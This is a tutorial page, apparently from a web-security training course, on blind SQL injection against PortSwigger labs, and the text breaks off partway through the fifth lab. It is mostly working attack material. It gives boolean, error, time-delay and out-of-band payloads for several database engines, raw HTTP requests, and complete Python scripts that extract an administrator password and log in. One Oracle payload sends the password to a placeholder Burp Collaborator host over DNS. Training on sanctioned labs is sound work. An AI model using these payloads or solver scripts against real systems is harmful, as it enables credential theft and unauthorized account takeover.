---
title: Blind SQL Injection
description: Boolean, error, time, and out-of-band inference channels — plus the scripts that turn one bit per request into a password.
---

# Blind SQL Injection · Extracting Secrets from Silence

<p class="wd-section-lede">Blind SQL injection is the cyber equivalent of playing <em>Twenty Questions</em> with a stone-faced witness. The website never displays database rows or helpful error messages on your screen. But by asking carefully phrased yes-or-no questions, you can force the server to blink—triggering a "Welcome back" banner, a 500 error, a five-second pause, or a silent DNS ping—until an entire administrative password is reconstructed, bit by bit.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Silent Interrogation.</strong> Imagine questioning a suspect who refuses to speak out loud. Whenever you state a true fact, they blink twice; whenever you state a false fact, they keep a total poker face. You can't see inside their memory, but by asking <em>"Is the first letter of your secret code between A and M?"</em>, you can deduce the exact vault combination in just a few dozen questions. That is the essence of a blind SQL oracle.</p>
</div>

## Case File #3: Listening to the Server's Unconscious Tells

Let's follow what happens when an e-commerce website tracks visitors with a <code>TrackingId</code> cookie:

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>Every HTTP request carries a <code>TrackingId=xyz123</code> cookie. The product catalog looks completely normal, but tampering with the cookie reveals an unconscious tell: a small "Welcome back" message in the header disappears, the page crashes with a 500 status code, or the response pauses for five seconds before loading.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The backend extracts the raw cookie string and glues it into an internal tracking query. If the query returns at least one row, the server sets a boolean flag in memory and renders personalized UI elements:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Application Query</span>
        <span><span class="wd-code-input">Gold</span> = Injected Condition</span>
        <span><span class="wd-code-dead">Strikethrough</span> = Discarded Tail</span>
      </div>
      <span class="wd-code-dev">SELECT * FROM tracking WHERE id = '</span><span class="wd-code-input">xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--</span><span class="wd-code-dead">'</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The entire tracking row's existence now hinges on whether your guess about the secret character is <strong>TRUE</strong> or <strong>FALSE</strong>. If the first character is indeed <code>'a'</code>, the condition evaluates to true, the tracking row is returned, and "Welcome back" appears. If wrong, the condition fails, zero rows return, and "Welcome back" vanishes. You now have a 1-bit radio transmitter!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers parameterize the query (<code>WHERE id = ?</code>). Cookies are untrusted user input—just like URL query parameters and form fields—and must never be concatenated directly into SQL statements.</p>
  </div>
</div>

### Visual Comparison: Static Cookie vs. The Logic Switch

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer assumed the <code>TrackingId</code> cookie was an opaque tracking token used only to retrieve past visit history and display a friendly greeting.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>The cookie became an executable boolean switch. By tying the greeting's display to subqueries on the <code>users</code> table, an attacker can extract any database record one bit per request.</p>
  </div>
</div>

---

## The Four Blind Extraction Channels

Detectives categorize blind SQL injection by the **channel** through which the database answers:

<div class="wd-flow">
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>1. Boolean Content</strong>
    A specific word ("Welcome back") or HTML tag appears or disappears based on truth value.
  </div>
  <div class="wd-flow__node">
    <strong>2. Conditional Error</strong>
    An unhandled exception (like <code>1/0</code>) triggers a 500 error page only when true.
  </div>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>3. Time Delay</strong>
    The database executes <code>SLEEP()</code> or <code>pg_sleep()</code> only when a condition holds true.
  </div>
  <div class="wd-flow__node">
    <strong>4. Out-of-Band (OAST)</strong>
    The database performs an external DNS/HTTP request to your collaborator listener.
  </div>
</div>

| Channel | What You Observe | Cost Per Bit | When to Use It |
| --- | --- | --- | --- |
| **Boolean Content** | A string, element, or row count appears/disappears | 1 request | The page renders conditional text |
| **Conditional Error** | A 500 status code triggers only when the condition is true | 1 request | Output content is static, but database errors surface |
| **Time Delay** | Response time pauses for 5–10 seconds only when true | 1 request + delay | No content or status code difference exists |
| **Out-of-Band (OAST)** | DNS/HTTP lookup arrives at your external listener | 1 request | Async queries or completely firewalled responses |

---

## Channel 1: Boolean Content Oracles

The classic target is a tracking cookie. The application inspects the `TrackingId` cookie and executes:

```sql
SELECT * FROM tracking WHERE id = '<COOKIE>'
```

If the query returns a row, the response includes `Welcome back`. If not, it does not.

### Step 1 — Calibrate the Oracle (True vs. False)

```sql
xyz' AND '1'='1
xyz' AND '1'='2
```

After substitution inside the database:
```sql
SELECT * FROM tracking WHERE id = 'xyz' AND '1'='1'  -- Returns True: "Welcome back" appears!
SELECT * FROM tracking WHERE id = 'xyz' AND '1'='2'  -- Returns False: "Welcome back" disappears!
```

> **Why `'1'='1'` instead of `1=1`?** String comparison cleanly closes the developer's opening single quote and matches the surrounding quote syntax without relying on numeric type casting.

### Step 2 — Turn Data Properties into Conditions

Ask yes/no questions using a scalar subquery:

```sql
-- 1. Does the users table exist?
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

-- 2. Does the administrator user exist?
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- 3. Is the password longer than 10 characters?
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
```

### Step 3 — Extract Characters One at a Time

```sql
xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a
```

By shifting the index (`1`, `2`, `3`, ...) and trying candidate letters, you discover the password character by character.

::: details 🔬 Under the Hood: Why the Subquery Comparison Works
SQL's `WHERE` clause expects a predicate. `(SELECT 'a' FROM users WHERE ...)='a'` compares two scalar values, returning `TRUE`, `FALSE`, or `UNKNOWN`. 

`LIMIT 1` is essential on PostgreSQL and MySQL: without it, a subquery returning multiple rows throws a runtime exception (`more than one row returned by a subquery used as an expression`). On Oracle, the equivalent guard is `WHERE ROWNUM = 1`.
:::

### Step 4 — Halve the Request Budget with Binary Search

Linear search over 36 characters requires up to 36 requests per character (~720 requests for a 20-character password). **Binary search over ASCII numbers cuts that down to just ~7 requests per character (~140 total):**

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Full Printable ASCII</strong>
    Range: 32 through 126 (95 chars)
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Binary Probe: <code>&gt; 79</code>?</strong>
    True: search 80..126<br>
    False: search 32..79
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>Exact Match in 7 Probes</strong>
    Halves the search space every request until low == high!
  </div>
</div>

```sql
xyz' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='administrator') > 79--
```

---

## Channel 2: Conditional-Error Blind Injection

When the HTML content never changes, make the database **crash intentionally** when your condition is true!

In Oracle, evaluate a division by zero (`1/0`) inside a `CASE` expression:

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Condition is **TRUE** (`1=1`) → executes `TO_CHAR(1/0)` → Division by Zero (`ORA-01476`) → HTTP 500 error!
- Condition is **FALSE** (`1=2`) → executes `''` → Query succeeds cleanly → HTTP 200 OK!

```sql
xyz'||(SELECT CASE WHEN (SUBSTR(password, 1, 1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

::: details 🔬 Under the Hood: Conditional Error Primitives by Engine
| Engine | Conditional Error Primitive |
| --- | --- |
| **Oracle** | `CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual` |
| **SQL Server** | `1=CASE WHEN (cond) THEN 1/0 ELSE 1 END` |
| **PostgreSQL** | `1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)` |
| **MySQL** | `(SELECT IF((cond), (SELECT table_name FROM information_schema.tables), 'a'))='a'` (multi-row error) |
:::

---

## Channel 3: Visible Error-Based Extraction (The Super-Channel)

What if the server is in debug mode and displays full database error messages on the page? You can trigger a type-conversion error and read the entire secret password straight out of the error dialog!

```sql
TrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

PostgreSQL attempts to convert the password into an integer, and fails with:
```text
ERROR: invalid input syntax for type integer: "s3curePassword123"
```

The password is leaked in the error text! No binary search, no timing jitter, no multiple requests.

---

## Channel 4: Time-Based Blind Injection

When the application returns identical HTML status codes and suppresses all error messages, force the database to **sleep** when your guess is true:

```sql
-- PostgreSQL: Sleep for 10 seconds if true
x';SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

::: details ⚙️ Database Engine Variations: Sleep Commands
| Engine | Unconditional Delay | Conditional Delay |
| --- | --- | --- |
| **PostgreSQL** | `pg_sleep(10)` | `CASE WHEN cond THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL** | `SLEEP(10)` | `IF(cond, SLEEP(10), 0)` |
| **SQL Server** | `WAITFOR DELAY '0:0:10'` | `IF (cond) WAITFOR DELAY '0:0:10'` |
| **Oracle** | `dbms_pipe.receive_message(('a'), 10)` | `CASE WHEN cond THEN 'a'\|\|dbms_pipe.receive_message(('a'), 10) ELSE NULL END FROM dual` |
:::

### Detective Rules for Timing Measurements
1. **Calibrate Baseline First:** Measure 5 normal requests to determine network jitter (e.g. 80ms ± 20ms).
2. **Set a Clean Threshold:** Use a delay well above jitter (e.g., 2–5 seconds).
3. **Never Run Concurrent Requests:** Multiple timing probes collide and corrupt each other's timestamps. Keep concurrency at 1.

---

## Channel 5: Out-of-Band (OAST) Exfiltration

When the query is asynchronous or completely insulated from HTTP responses, make the database reach out to an external server you control (e.g., Burp Collaborator):

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Injected SQL Function</strong>
    <code>EXTRACTVALUE(xmltype(...))</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Database DNS Resolver</strong>
    Resolves <code>&lt;secret&gt;.burpcollaborator.net</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>Attacker Listener</strong>
    Records subdomain string: secret password extracted in 1 shot!
  </div>
</div>

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

When Oracle parses the XML entity `%remote;`, it issues a DNS lookup for `s3curePassword.BURP-COLLABORATOR-SUBDOMAIN`. Your listener records the DNS request and immediately reveals the secret!

---

## The Detective's Universal Automation Blueprint

Every robust blind extraction script follows this exact 4-stage pipeline:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Calibrate Observable</strong>
    Confirm True vs False responses
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>2. Find Length</strong>
    Binary search on <code>LENGTH(password)</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Binary Search Characters</strong>
    Probe <code>ASCII(SUBSTRING(..., i, 1))</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>4. Assemble &amp; Authenticate</strong>
    Verify credential against <code>/login</code>
  </div>
</div>

---

## Practice Labs: Blind SQL Injection

Work through the seven case files below in order. They cover every blind extraction channel: content oracles, conditional errors, visible error leaks, time delays, and out-of-band exfiltration.

:::: lab

## Lab 1 · Blind SQLi with conditional responses {#lab-conditional-responses}

**Vulnerability class:** blind boolean, content oracle.
**Goal:** extract the administrator password and log in.

The tracking cookie is injected into a query. No rows and no errors are returned, but the page says `Welcome back` when the query returns a row.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

<LabCheckbox lab-id="lab-conditional-responses" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** You do not need to see the password. You need the page to answer yes/no questions about it.

**Level 2 — target parameter and approach.** Inject into the `TrackingId` cookie. First prove the oracle with `' AND '1'='1` versus `' AND '1'='2`, then ask questions with a scalar subquery: length, then one character at a time.

**Level 3 — exploit skeleton.**

```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a--
Connection: close
```

### The query before and after

```sql
-- before
SELECT * FROM tracking WHERE id = 'xyz'

-- after
SELECT * FROM tracking WHERE id = 'xyz'
AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--'
```

If the character matches, the subquery returns `'a'`, the comparison is true, the tracking row survives, and `Welcome back` appears. Otherwise the row is filtered out and the message disappears.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `xyz` | an arbitrary tracking id | Base value that may or may not match a row |
| `'` | closes the id literal | Code context |
| `AND` | adds a second predicate | Both must be true for a row to survive |
| `(SELECT ...)` | scalar subquery | Turns data into a comparable value |
| `SUBSTRING(password,1,1)` | one character at offset 1 | The bit you are testing |
| `FROM users WHERE username='administrator'` | scopes the subquery | Targets one row |
| `='a'` | comparison | The yes/no question |
| `--` | comment | Removes the original trailing quote |

> **Why the base value matters.** If `xyz` happens to match a tracking row, `xyz' AND false--` returns no row and `xyz' AND true--` returns a row, so the oracle still works. But if the base value itself is filtered, both sides may be false. Use a random, unlikely-to-exist value.

### Python `requests` solver

```python
import sys
import time
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
MARKER = "Welcome back"
COOKIE = "TrackingId"

def main() -> None:
    s = requests.Session()

    def probe(condition: str) -> bool:
        payload = f"xyz' AND ({condition})--"
        r = s.get(BASE, headers={"Cookie": f"{COOKIE}={quote(payload, safe='')}"}, timeout=20)
        return MARKER in r.text

    # Calibrate: the oracle must distinguish true from false.
    if not probe("'1'='1") or probe("'1'='2"):
        print("[!] Oracle is not behaving. Check the lab host and the marker.")
        sys.exit(1)
    print("[+] Boolean oracle confirmed.")

    # 1. Length via binary search.
    low, high = 0, 64
    while low < high:
        mid = (low + high) // 2
        if probe(f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {mid}"):
            low = mid + 1
        else:
            high = mid
    length = low
    print(f"[+] password length: {length}")

    # 2. Characters via ASCII binary search.
    password = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = (
                "(SELECT ASCII(SUBSTRING(password,"
                f"{pos},1)) FROM users WHERE username='administrator') > {mid}"
            )
            if probe(cond):
                low = mid + 1
            else:
                high = mid
        password += chr(low)
        print(f"\r[*] {password}", end="", flush=True)
    print()

    # 3. Verify by authenticating.
    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print(f"[+] Password: {password}")
        print("[+] Logged in. Lab solved.")
    else:
        print("[!] Extracted password did not authenticate. Re-check the oracle.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

The application leaks one bit through the presence of a string, and a scalar subquery lets you make that bit depend on any byte of the password.
:::

::::

:::: lab

## Lab 2 · Blind SQLi with conditional errors {#lab-conditional-errors}

**Vulnerability class:** blind boolean, error oracle.
**Goal:** extract the administrator password on Oracle without any content difference.

The page looks the same whether the query returns rows or not. But a genuine SQL error produces a different response.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

<LabCheckbox lab-id="lab-conditional-errors" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** If true and false look identical, make one of them throw an error. Which SQL construct chooses between two expressions based on a condition?

**Level 2 — target parameter and approach.** Inject into `TrackingId`. Use `CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END` inside a scalar subquery, concatenated into the cookie string. Oracle needs `FROM dual` when no table is otherwise referenced. First confirm a plain `'` gives an error and `''` removes it.

**Level 3 — exploit skeleton.**

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (LENGTH(password)>1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Connection: close
```

### The query before and after

```sql
-- before
SELECT * FROM tracking WHERE id = 'xyz'

-- after
SELECT * FROM tracking WHERE id = 'xyz'||(
  SELECT CASE WHEN (LENGTH(password)>1)
              THEN TO_CHAR(1/0)
              ELSE '' END
  FROM users WHERE username='administrator'
)||''
```

The concatenation keeps the whole expression a string. When the condition is true, `1/0` raises `ORA-01476`; when false, the empty string is returned and the page loads normally.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `xyz'` | closes the id literal | Code context |
| `\|\|` | Oracle string concatenation | Splices the subquery into the string |
| `(SELECT ...)` | scalar subquery | Must return exactly one row/value |
| `CASE WHEN (cond)` | conditional expression | The yes/no question |
| `THEN TO_CHAR(1/0)` | error branch | Raises division by zero only when true |
| `ELSE ''` | non-error branch | Keeps the expression a valid string |
| `FROM users WHERE username='administrator'` | scopes the subquery | One target row |
| `\|\|'` | closes the concatenation with the original quote | Repairs the syntax |
| `--` (optional) | comment | Removes the original tail |

> **Why `TO_CHAR(1/0)` and not just `1/0`?** Both raise the error, but `CASE` requires both branches to return compatible types. `TO_CHAR` makes the true branch a string, matching `''`. On other engines you may need a different wrapper or a different error primitive.

### Python `requests` solver

```python
import sys
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
COOKIE = "TrackingId"

def main() -> None:
    s = requests.Session()

    def probe(condition: str) -> bool:
        payload = (
            "xyz'||(SELECT CASE WHEN ("
            f"{condition}"
            ") THEN TO_CHAR(1/0) ELSE '' END FROM users "
            "WHERE username='administrator')||'"
        )
        r = s.get(BASE, headers={"Cookie": f"{COOKIE}={quote(payload, safe='')}"}, timeout=20)
        return r.status_code >= 500 or "Internal Server Error" in r.text

    # Calibrate: true must error, false must not.
    if not probe("1=1") or probe("1=2"):
        print("[!] Error oracle is not behaving. Verify Oracle syntax and the lab host.")
        sys.exit(1)
    print("[+] Conditional error oracle confirmed.")

    low, high = 0, 64
    while low < high:
        mid = (low + high) // 2
        if probe(f"LENGTH(password) > {mid}"):
            low = mid + 1
        else:
            high = mid
    length = low
    print(f"[+] password length: {length}")

    password = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTR(password,{pos},1)) > {mid}"
            if probe(cond):
                low = mid + 1
            else:
                high = mid
        password += chr(low)
        print(f"\r[*] {password}", end="", flush=True)
    print()

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print(f"[+] Password: {password}")
        print("[+] Logged in. Lab solved.")
    else:
        print("[!] Extracted password did not authenticate.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

`CASE` converts a data-dependent condition into the presence or absence of a runtime error, giving you a one-bit channel even when the response body never changes.
:::

::::

:::: lab

## Lab 3 · Visible error-based SQL injection {#lab-visible-error-based}

**Vulnerability class:** in-band error leakage.
**Goal:** leak the administrator password from a verbose PostgreSQL error, then log in.

The response does not return query rows, but it does return the database's error text — including the value that failed a type conversion.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)

<LabCheckbox lab-id="lab-visible-error-based" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** If you force the database to convert the password to a number, what will the error message contain?

**Level 2 — target parameter and approach.** Inject into `TrackingId`. Use a boolean comparison with `CAST((SELECT password FROM users LIMIT 1) AS int)`. The cookie has a length limit, so delete the original value and keep the payload short.

**Level 3 — exploit skeleton.**

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
Connection: close
```

### The query before and after

```sql
-- before
SELECT * FROM tracking WHERE id = 'ogAZZfxtOKUELbuJ'

-- after
SELECT * FROM tracking WHERE id = ''
AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--'
```

PostgreSQL tries to cast the first user's password to `int`. It fails and reports:

```text
ERROR: invalid input syntax for type integer: "s3curepassword"
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `TrackingId=` (empty) | removes the original value | Frees characters under the cookie length limit |
| `'` | closes the id literal | Code context |
| `AND 1=` | makes the expression boolean | PostgreSQL requires `AND` operands to be boolean |
| `CAST(... AS int)` | forces type conversion | The conversion failure is the leak |
| `(SELECT password FROM users LIMIT 1)` | scalar subquery | Must return exactly one row |
| `--` | comment | Repairs the trailing quote |

> **The length-limit trap.** If the cookie value is too long, the request is truncated before `--`. The database then sees an unterminated string and reports a syntax error instead of the cast error. Removing the original tracking value is not cosmetic; it is what keeps the payload under the limit.

### Python `requests` solver

```python
import re
import sys
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()

    def leak(column: str) -> str | None:
        payload = f"' AND 1=CAST((SELECT {column} FROM users LIMIT 1) AS int)--"
        r = s.get(BASE, headers={"Cookie": f"TrackingId={quote(payload, safe='')}"}, timeout=20)
        match = re.search(r'invalid input syntax for type integer:\s*"([^"]*)"', r.text, re.I)
        return match.group(1) if match else None

    username = leak("username")
    if not username:
        print("[!] Could not leak the username. Check the payload length and lab host.")
        sys.exit(1)
    print(f"[+] first user: {username}")

    # In this lab the administrator is the first row; confirm and leak the password.
    if username != "administrator":
        print("[!] First row is not administrator. Adjust the subquery if needed.")
        sys.exit(1)

    password = leak("password")
    if not password:
        print("[!] Could not leak the password.")
        sys.exit(1)
    print(f"[+] administrator password: {password}")

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in. Lab solved.")
    else:
        print("[!] Login failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

A type conversion error includes the offending source string, so forcing the secret through an incompatible cast turns the error message into the output channel.
:::

::::

:::: lab

## Lab 4 · Blind SQLi with time delays {#lab-time-delays}

**Vulnerability class:** blind time-based, execution proof.
**Goal:** cause a 10-second delay.

The query runs synchronously, but its result never influences the response. A time delay is the only observable effect.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

<LabCheckbox lab-id="lab-time-delays" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** You need the database itself to wait, not the network. Which PostgreSQL function sleeps?

**Level 2 — target parameter and approach.** Inject into `TrackingId`. Append a concatenated `pg_sleep(10)` so the query cannot finish until the sleep returns. This lab's database is PostgreSQL.

**Level 3 — exploit skeleton.**

```http
GET / HTTP/1.1
Cookie: TrackingId=x'%7C%7Cpg_sleep(10)--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=x'%7C%7Cpg_sleep(10)--
Connection: close
```

Decoded payload: `x'||pg_sleep(10)--`

### The query before and after

```sql
-- before
SELECT * FROM tracking WHERE id = 'x'

-- after
SELECT * FROM tracking WHERE id = 'x'||pg_sleep(10)--'
```

`pg_sleep(10)` returns void after ten seconds; `||` coerces it into the concatenated string. The query blocks for ten seconds and the HTTP response is delayed.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `x` | arbitrary id value | Base string |
| `'` | closes the literal | Code context |
| `%7C%7C` → `\|\|` | PostgreSQL concatenation | Forces `pg_sleep` into the same expression |
| `pg_sleep(10)` | server-side sleep | The observable effect |
| `--` | comment | Removes the original tail |
| `%7C` encoding | avoids cookie/header parsing issues | Optional; raw works in Burp |

> **Why `||` and not a semicolon?** Both can work on PostgreSQL. Concatenation keeps a single statement and is less likely to be blocked by drivers that disallow stacked queries. Stacked queries become necessary when the sleep cannot be embedded as an expression (for example, `WAITFOR` on SQL Server).

### Python `requests` solver

```python
import sys
import time
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    payload = "x'||pg_sleep(10)--"

    start = time.perf_counter()
    r = s.get(BASE, headers={"Cookie": f"TrackingId={quote(payload, safe='')}"}, timeout=30)
    elapsed = time.perf_counter() - start

    print(f"[*] HTTP {r.status_code} in {elapsed:.2f}s")
    if elapsed >= 9.0:
        print("[+] Delay observed. Lab solved.")
    else:
        print("[!] No delay. Check the lab host and PostgreSQL syntax.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

The database executes your expression synchronously, so making that expression sleep makes the entire HTTP response sleep, regardless of what the application does with the rows.
:::

::::

:::: lab

## Lab 5 · Time delays and information retrieval {#lab-time-delays-info-retrieval}

**Vulnerability class:** blind time-based, full extraction.
**Goal:** extract the administrator password using conditional delays, then log in.

No content, status, or error difference exists. You must turn every boolean into a delay.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

<LabCheckbox lab-id="lab-time-delays-info-retrieval" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** A `CASE` expression can choose between a long sleep and no sleep based on your condition.

**Level 2 — target parameter and approach.** Inject into `TrackingId`. Use a stacked `SELECT CASE WHEN (condition) THEN pg_sleep(...) ELSE pg_sleep(0) END FROM users` statement. Keep one request in flight at a time or timing becomes meaningless.

**Level 3 — exploit skeleton.**

```sql
x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1)
   THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username%3D'administrator'+AND+LENGTH(password)%3E1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
Connection: close
```

Decoded payload:

```sql
x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1)
   THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

### The query before and after

```sql
-- before
SELECT * FROM tracking WHERE id = 'x'

-- after: first statement (no delay), second statement (conditional delay)
SELECT * FROM tracking WHERE id = 'x';
SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1)
       THEN pg_sleep(10) ELSE pg_sleep(0) END
FROM users--;
```

The `%3B` is the semicolon that separates statements. It must be encoded in the cookie header, otherwise the HTTP cookie parser may split the value at `;` before the application ever sees it.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `x'` | closes the first query's literal | Ends the original statement |
| `%3B` → `;` | statement separator | Enables a second, independent statement |
| `SELECT CASE WHEN (...)` | conditional expression | Chooses between sleep and no-sleep |
| `username='administrator'` | row filter | Applies the condition to the target row |
| `AND LENGTH(password)>1` | the bit being tested | Replace with `SUBSTRING` comparisons |
| `THEN pg_sleep(10)` | true branch | Observable delay |
| `ELSE pg_sleep(0)` | false branch | Returns immediately |
| `FROM users` | row source | The second statement has its own `FROM` |
| `--` | comment | Neutralises the original trailing quote |

> **Why the first statement still matters.** The application executes the original `SELECT` and then the injected one. The original may return zero rows; that is fine. The delay comes from the second statement. This is a **stacked query**, and it only works because the PostgreSQL driver permits multiple statements.

### Python `requests` solver

```python
import sys
import time
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
DELAY = 1.2          # seconds; use 10 for the manual proof, smaller for automation
THRESHOLD = 0.8      # must be below DELAY and above observed jitter

def main() -> None:
    s = requests.Session()

    def probe(condition: str) -> bool:
        payload = (
            f"x';SELECT CASE WHEN ({condition}) THEN pg_sleep({DELAY}) "
            "ELSE pg_sleep(0) END FROM users--"
        )
        start = time.perf_counter()
        s.get(BASE, headers={"Cookie": f"TrackingId={quote(payload, safe='')}"}, timeout=30)
        elapsed = time.perf_counter() - start
        return elapsed >= THRESHOLD

    # Calibrate once.
    if not probe("username='administrator' AND 1=1"):
        print("[!] True condition did not delay. Check the lab host and stacked-query support.")
        sys.exit(1)
    if probe("username='administrator' AND 1=2"):
        print("[!] False condition delayed too. Increase DELAY or reduce noise.")
        sys.exit(1)
    print("[+] Timing oracle confirmed.")

    low, high = 0, 64
    while low < high:
        mid = (low + high) // 2
        if probe(f"username='administrator' AND LENGTH(password) > {mid}"):
            low = mid + 1
        else:
            high = mid
